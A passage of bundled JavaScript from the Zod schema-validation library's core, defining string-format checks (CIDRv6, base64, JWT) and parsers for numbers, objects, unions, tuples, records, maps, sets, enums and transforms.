  def.pattern ?? (def.pattern = cidrv4);
  $ZodStringFormat.init(inst, def);
});
var $ZodCIDRv6 = /* @__PURE__ */ $constructor("$ZodCIDRv6", (inst, def) => {
  def.pattern ?? (def.pattern = cidrv6);
  $ZodStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    const parts = payload.value.split("/");
    try {
      if (parts.length !== 2)
        throw new Error;
      const [address, prefix] = parts;
      if (!prefix)
        throw new Error;
      const prefixNum = Number(prefix);
      if (`${prefixNum}` !== prefix)
        throw new Error;
      if (prefixNum < 0 || prefixNum > 128)
        throw new Error;
      new URL(`http://[${address}]`);
    } catch {
      payload.issues.push({
        code: "invalid_format",
        format: "cidrv6",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
function isValidBase64(data) {
  if (data === "")
    return true;
  if (data.length % 4 !== 0)
    return false;
  try {
    atob(data);
    return true;
  } catch {
    return false;
  }
}
var $ZodBase64 = /* @__PURE__ */ $constructor("$ZodBase64", (inst, def) => {
  def.pattern ?? (def.pattern = base64);
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.contentEncoding = "base64";
  inst._zod.check = (payload) => {
    if (isValidBase64(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "base64",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
function isValidBase64URL(data) {
  if (!base64url.test(data))
    return false;
  const base642 = data.replace(/[-_]/g, (c) => c === "-" ? "+" : "/");
  const padded = base642.padEnd(Math.ceil(base642.length / 4) * 4, "=");
  return isValidBase64(padded);
}
var $ZodBase64URL = /* @__PURE__ */ $constructor("$ZodBase64URL", (inst, def) => {
  def.pattern ?? (def.pattern = base64url);
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.contentEncoding = "base64url";
  inst._zod.check = (payload) => {
    if (isValidBase64URL(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "base64url",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodE164 = /* @__PURE__ */ $constructor("$ZodE164", (inst, def) => {
  def.pattern ?? (def.pattern = e164);
  $ZodStringFormat.init(inst, def);
});
function isValidJWT(token, algorithm = null) {
  try {
    const tokensParts = token.split(".");
    if (tokensParts.length !== 3)
      return false;
    const [header] = tokensParts;
    if (!header)
      return false;
    const parsedHeader = JSON.parse(atob(header));
    if ("typ" in parsedHeader && parsedHeader?.typ !== "JWT")
      return false;
    if (!parsedHeader.alg)
      return false;
    if (algorithm && (!("alg" in parsedHeader) || parsedHeader.alg !== algorithm))
      return false;
    return true;
  } catch {
    return false;
  }
}
var $ZodJWT = /* @__PURE__ */ $constructor("$ZodJWT", (inst, def) => {
  $ZodStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    if (isValidJWT(payload.value, def.alg))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "jwt",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCustomStringFormat = /* @__PURE__ */ $constructor("$ZodCustomStringFormat", (inst, def) => {
  $ZodStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    if (def.fn(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: def.format,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodNumber = /* @__PURE__ */ $constructor("$ZodNumber", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = inst._zod.bag.pattern ?? number;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = Number(payload.value);
      } catch (_) {}
    const input = payload.value;
    if (typeof input === "number" && !Number.isNaN(input) && Number.isFinite(input)) {
      return payload;
    }
    const received = typeof input === "number" ? Number.isNaN(input) ? "NaN" : !Number.isFinite(input) ? "Infinity" : undefined : undefined;
    payload.issues.push({
      expected: "number",
      code: "invalid_type",
      input,
      inst,
      ...received ? { received } : {}
    });
    return payload;
  };
});
var $ZodNumberFormat = /* @__PURE__ */ $constructor("$ZodNumberFormat", (inst, def) => {
  $ZodCheckNumberFormat.init(inst, def);
  $ZodNumber.init(inst, def);
});
var $ZodBoolean = /* @__PURE__ */ $constructor("$ZodBoolean", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = boolean;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = Boolean(payload.value);
      } catch (_) {}
    const input = payload.value;
    if (typeof input === "boolean")
      return payload;
    payload.issues.push({
      expected: "boolean",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodBigInt = /* @__PURE__ */ $constructor("$ZodBigInt", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = bigint;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = BigInt(payload.value);
      } catch (_) {}
    if (typeof payload.value === "bigint")
      return payload;
    payload.issues.push({
      expected: "bigint",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodBigIntFormat = /* @__PURE__ */ $constructor("$ZodBigIntFormat", (inst, def) => {
  $ZodCheckBigIntFormat.init(inst, def);
  $ZodBigInt.init(inst, def);
});
var $ZodSymbol = /* @__PURE__ */ $constructor("$ZodSymbol", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "symbol")
      return payload;
    payload.issues.push({
      expected: "symbol",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodUndefined = /* @__PURE__ */ $constructor("$ZodUndefined", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = _undefined;
  inst._zod.values = new Set([undefined]);
  inst._zod.optin = "optional";
  inst._zod.optout = "optional";
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "undefined")
      return payload;
    payload.issues.push({
      expected: "undefined",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodNull = /* @__PURE__ */ $constructor("$ZodNull", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = _null;
  inst._zod.values = new Set([null]);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (input === null)
      return payload;
    payload.issues.push({
      expected: "null",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodAny = /* @__PURE__ */ $constructor("$ZodAny", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload) => payload;
});
var $ZodUnknown = /* @__PURE__ */ $constructor("$ZodUnknown", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload) => payload;
});
var $ZodNever = /* @__PURE__ */ $constructor("$ZodNever", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    payload.issues.push({
      expected: "never",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodVoid = /* @__PURE__ */ $constructor("$ZodVoid", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "undefined")
      return payload;
    payload.issues.push({
      expected: "void",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodDate = /* @__PURE__ */ $constructor("$ZodDate", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce) {
      try {
        payload.value = new Date(payload.value);
      } catch (_err) {}
    }
    const input = payload.value;
    const isDate = input instanceof Date;
    const isValidDate = isDate && !Number.isNaN(input.getTime());
    if (isValidDate)
      return payload;
    payload.issues.push({
      expected: "date",
      code: "invalid_type",
      input,
      ...isDate ? { received: "Invalid Date" } : {},
      inst
    });
    return payload;
  };
});
function handleArrayResult(result, final, index) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues(index, result.issues));
  }
  final.value[index] = result.value;
}
var $ZodArray = /* @__PURE__ */ $constructor("$ZodArray", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!Array.isArray(input)) {
      payload.issues.push({
        expected: "array",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    payload.value = Array(input.length);
    const proms = [];
    for (let i = 0;i < input.length; i++) {
      const item = input[i];
      const result = def.element._zod.run({
        value: item,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleArrayResult(result2, payload, i)));
      } else {
        handleArrayResult(result, payload, i);
      }
    }
    if (proms.length) {
      return Promise.all(proms).then(() => payload);
    }
    return payload;
  };
});
function handlePropertyResult(result, final, key, input, isOptionalOut) {
  if (result.issues.length) {
    if (isOptionalOut && !(key in input)) {
      return;
    }
    final.issues.push(...prefixIssues(key, result.issues));
  }
  if (result.value === undefined) {
    if (key in input) {
      final.value[key] = undefined;
    }
  } else {
    final.value[key] = result.value;
  }
}
function normalizeDef(def) {
  const keys = Object.keys(def.shape);
  for (const k of keys) {
    if (!def.shape?.[k]?._zod?.traits?.has("$ZodType")) {
      throw new Error(`Invalid element at key "${k}": expected a Zod schema`);
    }
  }
  const okeys = optionalKeys(def.shape);
  return {
    ...def,
    keys,
    keySet: new Set(keys),
    numKeys: keys.length,
    optionalKeys: new Set(okeys)
  };
}
function handleCatchall(proms, input, payload, ctx, def, inst) {
  const unrecognized = [];
  const keySet = def.keySet;
  const _catchall = def.catchall._zod;
  const t = _catchall.def.type;
  const isOptionalOut = _catchall.optout === "optional";
  for (const key in input) {
    if (keySet.has(key))
      continue;
    if (t === "never") {
      unrecognized.push(key);
      continue;
    }
    const r = _catchall.run({ value: input[key], issues: [] }, ctx);
    if (r instanceof Promise) {
      proms.push(r.then((r2) => handlePropertyResult(r2, payload, key, input, isOptionalOut)));
    } else {
      handlePropertyResult(r, payload, key, input, isOptionalOut);
    }
  }
  if (unrecognized.length) {
    payload.issues.push({
      code: "unrecognized_keys",
      keys: unrecognized,
      input,
      inst
    });
  }
  if (!proms.length)
    return payload;
  return Promise.all(proms).then(() => {
    return payload;
  });
}
var $ZodObject = /* @__PURE__ */ $constructor("$ZodObject", (inst, def) => {
  $ZodType.init(inst, def);
  const desc = Object.getOwnPropertyDescriptor(def, "shape");
  if (!desc?.get) {
    const sh = def.shape;
    Object.defineProperty(def, "shape", {
      get: () => {
        const newSh = { ...sh };
        Object.defineProperty(def, "shape", {
          value: newSh
        });
        return newSh;
      }
    });
  }
  const _normalized = cached(() => normalizeDef(def));
  defineLazy(inst._zod, "propValues", () => {
    const shape = def.shape;
    const propValues = {};
    for (const key in shape) {
      const field = shape[key]._zod;
      if (field.values) {
        propValues[key] ?? (propValues[key] = new Set);
        for (const v of field.values)
          propValues[key].add(v);
      }
    }
    return propValues;
  });
  const isObject2 = isObject;
  const catchall = def.catchall;
  let value;
  inst._zod.parse = (payload, ctx) => {
    value ?? (value = _normalized.value);
    const input = payload.value;
    if (!isObject2(input)) {
      payload.issues.push({
        expected: "object",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    payload.value = {};
    const proms = [];
    const shape = value.shape;
    for (const key of value.keys) {
      const el = shape[key];
      const isOptionalOut = el._zod.optout === "optional";
      const r = el._zod.run({ value: input[key], issues: [] }, ctx);
      if (r instanceof Promise) {
        proms.push(r.then((r2) => handlePropertyResult(r2, payload, key, input, isOptionalOut)));
      } else {
        handlePropertyResult(r, payload, key, input, isOptionalOut);
      }
    }
    if (!catchall) {
      return proms.length ? Promise.all(proms).then(() => payload) : payload;
    }
    return handleCatchall(proms, input, payload, ctx, _normalized.value, inst);
  };
});
var $ZodObjectJIT = /* @__PURE__ */ $constructor("$ZodObjectJIT", (inst, def) => {
  $ZodObject.init(inst, def);
  const superParse = inst._zod.parse;
  const _normalized = cached(() => normalizeDef(def));
  const generateFastpass = (shape) => {
    const doc = new Doc(["shape", "payload", "ctx"]);
    const normalized = _normalized.value;
    const parseStr = (key) => {
      const k = esc(key);
      return `shape[${k}]._zod.run({ value: input[${k}], issues: [] }, ctx)`;
    };
    doc.write(`const input = payload.value;`);
    const ids = Object.create(null);
    let counter = 0;
    for (const key of normalized.keys) {
      ids[key] = `key_${counter++}`;
    }
    doc.write(`const newResult = {};`);
    for (const key of normalized.keys) {
      const id = ids[key];
      const k = esc(key);
      const schema = shape[key];
      const isOptionalOut = schema?._zod?.optout === "optional";
      doc.write(`const ${id} = ${parseStr(key)};`);
      if (isOptionalOut) {
        doc.write(`
        if (${id}.issues.length) {
          if (${k} in input) {
            payload.issues = payload.issues.concat(${id}.issues.map(iss => ({
              ...iss,
              path: iss.path ? [${k}, ...iss.path] : [${k}]
            })));
          }
        }
        
        if (${id}.value === undefined) {
          if (${k} in input) {
            newResult[${k}] = undefined;
          }
        } else {
          newResult[${k}] = ${id}.value;
        }
        
      `);
      } else {
        doc.write(`
        if (${id}.issues.length) {
          payload.issues = payload.issues.concat(${id}.issues.map(iss => ({
            ...iss,
            path: iss.path ? [${k}, ...iss.path] : [${k}]
          })));
        }
        
        if (${id}.value === undefined) {
          if (${k} in input) {
            newResult[${k}] = undefined;
          }
        } else {
          newResult[${k}] = ${id}.value;
        }
        
      `);
      }
    }
    doc.write(`payload.value = newResult;`);
    doc.write(`return payload;`);
    const fn = doc.compile();
    return (payload, ctx) => fn(shape, payload, ctx);
  };
  let fastpass;
  const isObject2 = isObject;
  const jit = !globalConfig.jitless;
  const allowsEval2 = allowsEval;
  const fastEnabled = jit && allowsEval2.value;
  const catchall = def.catchall;
  let value;
  inst._zod.parse = (payload, ctx) => {
    value ?? (value = _normalized.value);
    const input = payload.value;
    if (!isObject2(input)) {
      payload.issues.push({
        expected: "object",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    if (jit && fastEnabled && ctx?.async === false && ctx.jitless !== true) {
      if (!fastpass)
        fastpass = generateFastpass(def.shape);
      payload = fastpass(payload, ctx);
      if (!catchall)
        return payload;
      return handleCatchall([], input, payload, ctx, value, inst);
    }
    return superParse(payload, ctx);
  };
});
function handleUnionResults(results, final, inst, ctx) {
  for (const result of results) {
    if (result.issues.length === 0) {
      final.value = result.value;
      return final;
    }
  }
  const nonaborted = results.filter((r) => !aborted(r));
  if (nonaborted.length === 1) {
    final.value = nonaborted[0].value;
    return nonaborted[0];
  }
  final.issues.push({
    code: "invalid_union",
    input: final.value,
    inst,
    errors: results.map((result) => result.issues.map((iss) => finalizeIssue(iss, ctx, config())))
  });
  return final;
}
var $ZodUnion = /* @__PURE__ */ $constructor("$ZodUnion", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "optin", () => def.options.some((o) => o._zod.optin === "optional") ? "optional" : undefined);
  defineLazy(inst._zod, "optout", () => def.options.some((o) => o._zod.optout === "optional") ? "optional" : undefined);
  defineLazy(inst._zod, "values", () => {
    if (def.options.every((o) => o._zod.values)) {
      return new Set(def.options.flatMap((option) => Array.from(option._zod.values)));
    }
    return;
  });
  defineLazy(inst._zod, "pattern", () => {
    if (def.options.every((o) => o._zod.pattern)) {
      const patterns = def.options.map((o) => o._zod.pattern);
      return new RegExp(`^(${patterns.map((p) => cleanRegex(p.source)).join("|")})$`);
    }
    return;
  });
  const single = def.options.length === 1;
  const first = def.options[0]._zod.run;
  inst._zod.parse = (payload, ctx) => {
    if (single) {
      return first(payload, ctx);
    }
    let async = false;
    const results = [];
    for (const option of def.options) {
      const result = option._zod.run({
        value: payload.value,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        results.push(result);
        async = true;
      } else {
        if (result.issues.length === 0)
          return result;
        results.push(result);
      }
    }
    if (!async)
      return handleUnionResults(results, payload, inst, ctx);
    return Promise.all(results).then((results2) => {
      return handleUnionResults(results2, payload, inst, ctx);
    });
  };
});
function handleExclusiveUnionResults(results, final, inst, ctx) {
  const successes = results.filter((r) => r.issues.length === 0);
  if (successes.length === 1) {
    final.value = successes[0].value;
    return final;
  }
  if (successes.length === 0) {
    final.issues.push({
      code: "invalid_union",
      input: final.value,
      inst,
      errors: results.map((result) => result.issues.map((iss) => finalizeIssue(iss, ctx, config())))
    });
  } else {
    final.issues.push({
      code: "invalid_union",
      input: final.value,
      inst,
      errors: [],
      inclusive: false
    });
  }
  return final;
}
var $ZodXor = /* @__PURE__ */ $constructor("$ZodXor", (inst, def) => {
  $ZodUnion.init(inst, def);
  def.inclusive = false;
  const single = def.options.length === 1;
  const first = def.options[0]._zod.run;
  inst._zod.parse = (payload, ctx) => {
    if (single) {
      return first(payload, ctx);
    }
    let async = false;
    const results = [];
    for (const option of def.options) {
      const result = option._zod.run({
        value: payload.value,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        results.push(result);
        async = true;
      } else {
        results.push(result);
      }
    }
    if (!async)
      return handleExclusiveUnionResults(results, payload, inst, ctx);
    return Promise.all(results).then((results2) => {
      return handleExclusiveUnionResults(results2, payload, inst, ctx);
    });
  };
});
var $ZodDiscriminatedUnion = /* @__PURE__ */ $constructor("$ZodDiscriminatedUnion", (inst, def) => {
  def.inclusive = false;
  $ZodUnion.init(inst, def);
  const _super = inst._zod.parse;
  defineLazy(inst._zod, "propValues", () => {
    const propValues = {};
    for (const option of def.options) {
      const pv = option._zod.propValues;
      if (!pv || Object.keys(pv).length === 0)
        throw new Error(`Invalid discriminated union option at index "${def.options.indexOf(option)}"`);
      for (const [k, v] of Object.entries(pv)) {
        if (!propValues[k])
          propValues[k] = new Set;
        for (const val of v) {
          propValues[k].add(val);
        }
      }
    }
    return propValues;
  });
  const disc = cached(() => {
    const opts = def.options;
    const map = new Map;
    for (const o of opts) {
      const values = o._zod.propValues?.[def.discriminator];
      if (!values || values.size === 0)
        throw new Error(`Invalid discriminated union option at index "${def.options.indexOf(o)}"`);
      for (const v of values) {
        if (map.has(v)) {
          throw new Error(`Duplicate discriminator value "${String(v)}"`);
        }
        map.set(v, o);
      }
    }
    return map;
  });
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!isObject(input)) {
      payload.issues.push({
        code: "invalid_type",
        expected: "object",
        input,
        inst
      });
      return payload;
    }
    const opt = disc.value.get(input?.[def.discriminator]);
    if (opt) {
      return opt._zod.run(payload, ctx);
    }
    if (def.unionFallback) {
      return _super(payload, ctx);
    }
    payload.issues.push({
      code: "invalid_union",
      errors: [],
      note: "No matching discriminator",
      discriminator: def.discriminator,
      input,
      path: [def.discriminator],
      inst
    });
    return payload;
  };
});
var $ZodIntersection = /* @__PURE__ */ $constructor("$ZodIntersection", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    const left = def.left._zod.run({ value: input, issues: [] }, ctx);
    const right = def.right._zod.run({ value: input, issues: [] }, ctx);
    const async = left instanceof Promise || right instanceof Promise;
    if (async) {
      return Promise.all([left, right]).then(([left2, right2]) => {
        return handleIntersectionResults(payload, left2, right2);
      });
    }
    return handleIntersectionResults(payload, left, right);
  };
});
function mergeValues(a, b) {
  if (a === b) {
    return { valid: true, data: a };
  }
  if (a instanceof Date && b instanceof Date && +a === +b) {
    return { valid: true, data: a };
  }
  if (isPlainObject(a) && isPlainObject(b)) {
    const bKeys = Object.keys(b);
    const sharedKeys = Object.keys(a).filter((key) => bKeys.indexOf(key) !== -1);
    const newObj = { ...a, ...b };
    for (const key of sharedKeys) {
      const sharedValue = mergeValues(a[key], b[key]);
      if (!sharedValue.valid) {
        return {
          valid: false,
          mergeErrorPath: [key, ...sharedValue.mergeErrorPath]
        };
      }
      newObj[key] = sharedValue.data;
    }
    return { valid: true, data: newObj };
  }
  if (Array.isArray(a) && Array.isArray(b)) {
    if (a.length !== b.length) {
      return { valid: false, mergeErrorPath: [] };
    }
    const newArray = [];
    for (let index = 0;index < a.length; index++) {
      const itemA = a[index];
      const itemB = b[index];
      const sharedValue = mergeValues(itemA, itemB);
      if (!sharedValue.valid) {
        return {
          valid: false,
          mergeErrorPath: [index, ...sharedValue.mergeErrorPath]
        };
      }
      newArray.push(sharedValue.data);
    }
    return { valid: true, data: newArray };
  }
  return { valid: false, mergeErrorPath: [] };
}
function handleIntersectionResults(result, left, right) {
  const unrecKeys = new Map;
  let unrecIssue;
  for (const iss of left.issues) {
    if (iss.code === "unrecognized_keys") {
      unrecIssue ?? (unrecIssue = iss);
      for (const k of iss.keys) {
        if (!unrecKeys.has(k))
          unrecKeys.set(k, {});
        unrecKeys.get(k).l = true;
      }
    } else {
      result.issues.push(iss);
    }
  }
  for (const iss of right.issues) {
    if (iss.code === "unrecognized_keys") {
      for (const k of iss.keys) {
        if (!unrecKeys.has(k))
          unrecKeys.set(k, {});
        unrecKeys.get(k).r = true;
      }
    } else {
      result.issues.push(iss);
    }
  }
  const bothKeys = [...unrecKeys].filter(([, f]) => f.l && f.r).map(([k]) => k);
  if (bothKeys.length && unrecIssue) {
    result.issues.push({ ...unrecIssue, keys: bothKeys });
  }
  if (aborted(result))
    return result;
  const merged = mergeValues(left.value, right.value);
  if (!merged.valid) {
    throw new Error(`Unmergable intersection. Error path: ` + `${JSON.stringify(merged.mergeErrorPath)}`);
  }
  result.value = merged.data;
  return result;
}
var $ZodTuple = /* @__PURE__ */ $constructor("$ZodTuple", (inst, def) => {
  $ZodType.init(inst, def);
  const items = def.items;
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!Array.isArray(input)) {
      payload.issues.push({
        input,
        inst,
        expected: "tuple",
        code: "invalid_type"
      });
      return payload;
    }
    payload.value = [];
    const proms = [];
    const reversedIndex = [...items].reverse().findIndex((item) => item._zod.optin !== "optional");
    const optStart = reversedIndex === -1 ? 0 : items.length - reversedIndex;
    if (!def.rest) {
      const tooBig = input.length > items.length;
      const tooSmall = input.length < optStart - 1;
      if (tooBig || tooSmall) {
        payload.issues.push({
          ...tooBig ? { code: "too_big", maximum: items.length, inclusive: true } : { code: "too_small", minimum: items.length },
          input,
          inst,
          origin: "array"
        });
        return payload;
      }
    }
    let i = -1;
    for (const item of items) {
      i++;
      if (i >= input.length) {
        if (i >= optStart)
          continue;
      }
      const result = item._zod.run({
        value: input[i],
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleTupleResult(result2, payload, i)));
      } else {
        handleTupleResult(result, payload, i);
      }
    }
    if (def.rest) {
      const rest = input.slice(items.length);
      for (const el of rest) {
        i++;
        const result = def.rest._zod.run({
          value: el,
          issues: []
        }, ctx);
        if (result instanceof Promise) {
          proms.push(result.then((result2) => handleTupleResult(result2, payload, i)));
        } else {
          handleTupleResult(result, payload, i);
        }
      }
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleTupleResult(result, final, index) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues(index, result.issues));
  }
  final.value[index] = result.value;
}
var $ZodRecord = /* @__PURE__ */ $constructor("$ZodRecord", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!isPlainObject(input)) {
      payload.issues.push({
        expected: "record",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    const proms = [];
    const values = def.keyType._zod.values;
    if (values) {
      payload.value = {};
      const recordKeys = new Set;
      for (const key of values) {
        if (typeof key === "string" || typeof key === "number" || typeof key === "symbol") {
          recordKeys.add(typeof key === "number" ? key.toString() : key);
          const result = def.valueType._zod.run({ value: input[key], issues: [] }, ctx);
          if (result instanceof Promise) {
            proms.push(result.then((result2) => {
              if (result2.issues.length) {
                payload.issues.push(...prefixIssues(key, result2.issues));
              }
              payload.value[key] = result2.value;
            }));
          } else {
            if (result.issues.length) {
              payload.issues.push(...prefixIssues(key, result.issues));
            }
            payload.value[key] = result.value;
          }
        }
      }
      let unrecognized;
      for (const key in input) {
        if (!recordKeys.has(key)) {
          unrecognized = unrecognized ?? [];
          unrecognized.push(key);
        }
      }
      if (unrecognized && unrecognized.length > 0) {
        payload.issues.push({
          code: "unrecognized_keys",
          input,
          inst,
          keys: unrecognized
        });
      }
    } else {
      payload.value = {};
      for (const key of Reflect.ownKeys(input)) {
        if (key === "__proto__")
          continue;
        let keyResult = def.keyType._zod.run({ value: key, issues: [] }, ctx);
        if (keyResult instanceof Promise) {
          throw new Error("Async schemas not supported in object keys currently");
        }
        const checkNumericKey = typeof key === "string" && number.test(key) && keyResult.issues.length;
        if (checkNumericKey) {
          const retryResult = def.keyType._zod.run({ value: Number(key), issues: [] }, ctx);
          if (retryResult instanceof Promise) {
            throw new Error("Async schemas not supported in object keys currently");
          }
          if (retryResult.issues.length === 0) {
            keyResult = retryResult;
          }
        }
        if (keyResult.issues.length) {
          if (def.mode === "loose") {
            payload.value[key] = input[key];
          } else {
            payload.issues.push({
              code: "invalid_key",
              origin: "record",
              issues: keyResult.issues.map((iss) => finalizeIssue(iss, ctx, config())),
              input: key,
              path: [key],
              inst
            });
          }
          continue;
        }
        const result = def.valueType._zod.run({ value: input[key], issues: [] }, ctx);
        if (result instanceof Promise) {
          proms.push(result.then((result2) => {
            if (result2.issues.length) {
              payload.issues.push(...prefixIssues(key, result2.issues));
            }
            payload.value[keyResult.value] = result2.value;
          }));
        } else {
          if (result.issues.length) {
            payload.issues.push(...prefixIssues(key, result.issues));
          }
          payload.value[keyResult.value] = result.value;
        }
      }
    }
    if (proms.length) {
      return Promise.all(proms).then(() => payload);
    }
    return payload;
  };
});
var $ZodMap = /* @__PURE__ */ $constructor("$ZodMap", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!(input instanceof Map)) {
      payload.issues.push({
        expected: "map",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    const proms = [];
    payload.value = new Map;
    for (const [key, value] of input) {
      const keyResult = def.keyType._zod.run({ value: key, issues: [] }, ctx);
      const valueResult = def.valueType._zod.run({ value, issues: [] }, ctx);
      if (keyResult instanceof Promise || valueResult instanceof Promise) {
        proms.push(Promise.all([keyResult, valueResult]).then(([keyResult2, valueResult2]) => {
          handleMapResult(keyResult2, valueResult2, payload, key, input, inst, ctx);
        }));
      } else {
        handleMapResult(keyResult, valueResult, payload, key, input, inst, ctx);
      }
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleMapResult(keyResult, valueResult, final, key, input, inst, ctx) {
  if (keyResult.issues.length) {
    if (propertyKeyTypes.has(typeof key)) {
      final.issues.push(...prefixIssues(key, keyResult.issues));
    } else {
      final.issues.push({
        code: "invalid_key",
        origin: "map",
        input,
        inst,
        issues: keyResult.issues.map((iss) => finalizeIssue(iss, ctx, config()))
      });
    }
  }
  if (valueResult.issues.length) {
    if (propertyKeyTypes.has(typeof key)) {
      final.issues.push(...prefixIssues(key, valueResult.issues));
    } else {
      final.issues.push({
        origin: "map",
        code: "invalid_element",
        input,
        inst,
        key,
        issues: valueResult.issues.map((iss) => finalizeIssue(iss, ctx, config()))
      });
    }
  }
  final.value.set(keyResult.value, valueResult.value);
}
var $ZodSet = /* @__PURE__ */ $constructor("$ZodSet", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!(input instanceof Set)) {
      payload.issues.push({
        input,
        inst,
        expected: "set",
        code: "invalid_type"
      });
      return payload;
    }
    const proms = [];
    payload.value = new Set;
    for (const item of input) {
      const result = def.valueType._zod.run({ value: item, issues: [] }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleSetResult(result2, payload)));
      } else
        handleSetResult(result, payload);
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleSetResult(result, final) {
  if (result.issues.length) {
    final.issues.push(...result.issues);
  }
  final.value.add(result.value);
}
var $ZodEnum = /* @__PURE__ */ $constructor("$ZodEnum", (inst, def) => {
  $ZodType.init(inst, def);
  const values = getEnumValues(def.entries);
  const valuesSet = new Set(values);
  inst._zod.values = valuesSet;
  inst._zod.pattern = new RegExp(`^(${values.filter((k) => propertyKeyTypes.has(typeof k)).map((o) => typeof o === "string" ? escapeRegex(o) : o.toString()).join("|")})$`);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (valuesSet.has(input)) {
      return payload;
    }
    payload.issues.push({
      code: "invalid_value",
      values,
      input,
      inst
    });
    return payload;
  };
});
var $ZodLiteral = /* @__PURE__ */ $constructor("$ZodLiteral", (inst, def) => {
  $ZodType.init(inst, def);
  if (def.values.length === 0) {
    throw new Error("Cannot create literal schema with no valid values");
  }
  const values = new Set(def.values);
  inst._zod.values = values;
  inst._zod.pattern = new RegExp(`^(${def.values.map((o) => typeof o === "string" ? escapeRegex(o) : o ? escapeRegex(o.toString()) : String(o)).join("|")})$`);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (values.has(input)) {
      return payload;
    }
    payload.issues.push({
      code: "invalid_value",
      values: def.values,
      input,
      inst
    });
    return payload;
  };
});
var $ZodFile = /* @__PURE__ */ $constructor("$ZodFile", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (input instanceof File)
      return payload;
    payload.issues.push({
      expected: "file",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodTransform = /* @__PURE__ */ $constructor("$ZodTransform", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      throw new $ZodEncodeError(inst.constructor.name);
    }
    const _out = def.transform(payload.value, payload);
    if (ctx.async) {
      const output = _out instanceof Promise ? _out : Promise.resolve(_out);
      return output.then((output2) => {
        payload.value = output2;
        return payload;
      });
    }
    if (_out instanceof Promise) {
      throw new $ZodAsyncError;
    }
    payload.value = _out;
    return payload;
  };
});
function handleOptionalResult(result, input) {
  if (result.issues.length && input === undefined) {
